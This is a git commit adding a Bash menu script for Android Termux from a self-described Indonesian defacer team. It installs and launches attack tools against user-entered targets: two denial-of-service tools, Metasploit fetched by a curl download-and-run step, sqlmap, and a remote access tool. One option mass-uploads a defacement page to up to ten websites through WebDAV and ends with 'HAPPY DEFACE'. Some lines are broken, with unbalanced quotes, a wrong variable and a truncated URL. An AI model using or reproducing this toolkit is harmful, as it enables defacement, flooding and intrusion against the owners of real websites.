6d3ee71f0daf82822d5ee9831c5d90fe67b5064b
victor0901 <45844414+victor0901@users.noreply.github.com>
2018-12-13 18:12:15 +0900

    TriVor.sh

---
+++ TriVor.sh
@@ -0,0 +1,265 @@
+
+#!/system/xbin/bash
+#MauNgapainGblk?
+#DiRecodeGakBakalJadiinLuMastah
+#DiGantiAuthorGakBakalJadiinLuMaster
+#MikirMakeOtakGblk
+#KontolKaloMauReedit/Recode
+#Pm Gua Bangsat
+clear
+cd module
+python2 please.py
+blue='\033[34;1m'
+green='\033[32;1m'
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+white='\033[37;1m'
+yellow='\033[33;1m'
+sleep 1
+echo $red
+cat asw.txt
+echo ""
+echo "\033[34;1m[$]\033[36;1m============================\033[34;1m[$]"
+echo "\033[32;1mAuthor : USER003F"
+echo "\033[37;1mFeat: 003T GARUDA"
+echo "\033[35;1mTeam : TENGKORAK HACKER TEAM"
+echo "\033[33;1mKontak Me :  081248292264"
+echo "\033[92mTENGKORAK HACKER TEAM"
+echo "\033[36;1m003T Show Of Defacer"
+echo "\033[34;1m[$]\033[36;1m============================\033[34;1m[$]"
+echo ""
+echo "\033[32;1mSilahkan Pilih Tools Yang mau Kamu pake:)?:"
+echo "\033[36;1m"
+echo "[===============================================[>"
+echo $green "1.> Red_HAWK"
+echo "[===============================================]>"
+echo $purple "2.> torshammer"
+echo "[===============================================]>"
+echo $cyan "3.> LITEDDOS"
+echo "[===============================================]>"
+echo $red "4.> METASPLOIT-FRAMEWORK"
+echo "[===============================================]>"
+echo $white "5.> SQLMAP"
+echo "[===============================================]>"
+echo $green "6.> Diejobu"
+echo "[===============================================]>"
+echo $purple "7.> LazySQLMAP"
+echo "[===============================================]>"
+echo $cyan "8.> A-RAT"
+echo "[===============================================]>"
+echo $red "9.> BruteWebDav
+echo
+"[===============================================]>"
+echo $blue "10.> WAScan
+echo
+"[===============================================]>"
+echo "\033[32;1m"
+read -p "root@tools-USER003F~#" bro
+[ $bro = 24 ] || [ $bro = 24 ]
+
+if [ $bro = 1 ] || [ $bro = 1 ]
+then
+clear
+toilet -f standard -F gay "USER003F"
+sleep 3
+apt update
+apt install git
+apt install php
+git clone https://github.com/Tuhinshubhra/RED_HAWK
+mv RED_HAWK $HOME
+cd $HOME/RED_HAWK
+chmod +x rhawk.php
+php rhawk.php
+fi
+
+if [ $bro = 2 ] || [ $bro = 2 ]
+then
+clear
+toilet -f standard -F gay "USER003F"
+apt update
+apt install git
+apt install tor
+git clone https://github.com/dotfighter/torshammer.git
+mv torshammer $HOME
+cd $HOME/torshammer
+read -p "Masukan Target==>:" target
+python2 torshammer.py -T -t target
+fi
+
+if [ $bro = 3 ] || [ $bro = 3 ]
+then
+clear
+toilet -f standard -F gay "USER003F"
+sleep 3
+apt update
+apt install git
+git clone https://github.com/4L13199/LITEDDOS
+mv LITEDDOS $HOME
+cd $HOME/LITEDDOS
+read -p "MasukanTarget:" target
+python2 LITEDDOS.py target 80 100
+fi
+
+if [ $bro = 4 ] || [ $bro = 4 ]
+then
+clear
+cowsay -f kiss.cow "USEROO3F" | lolcat
+figlet "USER003F" | lolcat
+sleep 1
+pkg install curl
+curl -LO https://raw.githubusercontent.com/Hax4us/Metasploit_termux/master/m$
+chmod +x metasploit.sh
+./metasploit.sh
+sleep 5
+mv metasploit-framework $HOME
+cd $HOME/metasploit-framework
+./msfconsole
+fi
+
+if [ $bro = 5 ] || [ $bro = 5 ]
+then
+clear
+toilet -f standard -F gay "USER003F"
+apt update
+apt install git
+git clone https://github.com/sqlmapproject/sqlmap
+mv sqlmap $HOME
+cd $HOME/sqlmap
+read -p "masukan web target:" target
+python2 sqlmap.py -D target
+fi
+
+if [ $bro = 6 ] || [ $bro = 6 ]
+then
+clear
+figlet "USER003F" | lolcat
+sleep 1
+apt install git
+apt install php
+git clone https://github.com/alintamvanz/diejoubu
+mv diejoubu $HOME
+cd $HOME/diejoubu
+cd v1.2
+php diejoubu.php
+fi
+
+if [ $bro = 7 ] || [ $bro = 7 ]
+then
+clear
+figlet "USER003F" | lolcat
+sleep 1
+apt update && apt upgrade
+apt install python2
+apt install git
+git clone https://github.com/verluchie/termux-lazysqlmap.git
+mv termux-lazysqlmap $HOME
+cd $HOME/termux-lazysqlmap
+chmod 777 install.sh
+./install.sh
+lazysqlmap
+fi
+
+if [ $bro = 8 ] || [ $bro = 8 ]
+then
+clear
+figlet "USER003F" | lolcat
+sleep 1
+git clone https://github.com/Xi4u7/A-Rat.git
+mv A-Rat $HOME
+cd $HOME/A-Rat
+python2 A-Rat.py
+fi
+
+if [ $bro = 9 ] || [ $bro = 9 ]
+then
+clear
+toilet -f standard -F gay "BruteWebdav"
+echo "\033[32;1mauthor: USER003F"
+echo "\033[33;1mTeam: TENGKORAK HACKER TEAM"
+echo "\033[34;1m003T Show Of Defacer"
+echo "Masukan nama script"
+read -p "[=======>" script
+echo "\033[32;1m"
+echo "Masukan Web Target Ke1"
+read -p "[=======>" Ke1
+curl -T /storage/emulated/0/$script $Ke1
+echo "\033[32;1m" "Masukan Web Target Ke2 "
+read -p "[=======>" Ke2
+curl -T /storage/emulated/0/$script $Ke2
+echo "\033[32;1m" "Masukan Web Target Ke3"
+read -p "[=======>" Ke3
+curl -T /storage/emulated/0/$script $Ke3
+echo "\033[32;1m" "Masukan Web Target Ke4"
+read -p "[=======>" Ke4
+curl -T /storage/emulated/0/$script $Ke5
+echo "\033[32;1m" "Masukan Web Target Ke5"
+read -p "[=======>" Ke5
+curl -T /storage/emulated/0/$script $Ke5
+echo "\033[32;1m" "Masukan Web Target Ke6"
+read -p "[=======>" Ke6
+curl -T /storage/emulated/0/$script $Ke6
+echo "\033[32;1m" "Masukan Web Target Ke7"
+read -p "[=======>" Ke7
+curl -T /storage/emulated/0/$script $Ke7
+echo "\033[32;1m" "Masukan Web Target Ke8"
+read -p "[=======>" Ke8
+curl -T /storage/emulated/0/$script $Ke8
+echo "\033[32;1m" "Masukan Web Target Ke9"
+read -p "[=======>" Ke9
+curl -T /storage/emulated/0/$script $Ke9
+echo "\033[32;1m" "Masukan Web Target Ke10"
+read -p "[=======>" Ke10
+curl -T /storage/emulated/0/$script $Ke10
+sleep 1
+echo "[<=====================SEDANG PROSES=====================>]"
+echo "Silahkan Cek Web $Ke1/$script"
+echo "Silahkan Cek Web $Ke2/$script"
+echo "Silahkan Cek Web $Ke3/$script"
+echo "Silahkan Cek Web $Ke4/$script"
+echo "Silahkan Cek Web $Ke5/$script"
+echo "Silahkan Cek Web $Ke6/$script"
+echo "Silahkan Cek Web $Ke7/$script"
+echo "Silahkan Cek Web $Ke8/$script"
+echo "Silahkan Cek Web $Ke9/$script"
+echo "Silahkan Cek Web $Ke10/$script"
+echo "[=============HAPPY DEFACE=============]"
+fi
+
+if [ $bro = 10 ] || [ $bro = 10 ]
+then
+clear
+cowsay -f kiss.cow "USER003F" | lolcat
+figlet "USER003F" | lolcat
+sleep 1
+apt update && apt upgrade
+apt install python2
+apt install git
+pip2 install -r requirements.txt
+git clone https://github.com/m4II0k/WAScan.git
+mv WAScan $HOME
+cd $HOME/WAScan
+pip2 install -r requirements.txt
+clear
+chmod +x wascan.py
+python2 wascan.py
+fi
+
+if [ $bro = 0 ] || [ $bro = 00 ]
+then
+echo "\033[32;1mTENGKORAK HACKER TEAM"
+sleep 1
+echo "\033[33;1mWe Security"
+sleep 1
+echo " We Are Aktivis"
+sleep 1
+echo "We Are Family"
+sleep 1
+echo "Hacking Is Not Criminal"
+sleep 1
+echo "Never Giv Up"
+sleep 1
+echo "\033[32;1mKarna Suatu Hari Nanti Ku Yakin Ku Kan Mencapainya"
+sleep 1
+exit
+fi
